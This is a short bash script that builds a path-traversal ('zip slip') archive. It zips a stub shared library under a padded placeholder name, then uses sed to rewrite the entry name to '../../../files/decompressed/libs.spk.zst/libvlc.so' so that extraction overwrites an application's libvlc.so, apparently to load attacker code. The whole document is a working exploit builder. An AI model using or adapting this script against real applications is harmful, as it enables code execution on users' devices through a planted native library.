#!/bin/bash

#
# We need to have our custom library extracted here:
#
# ../../../files/decompressed/libs.spk.zst/libvlc.so
#

cp stub.so AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.so
zip - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.so | \
    LC_ALL=C sed s/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.so/..\\/..\\/..\\/files\\/decompressed\\/libs.spk.zst\\/libvlc.so/g > payload.zip
rm AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.so
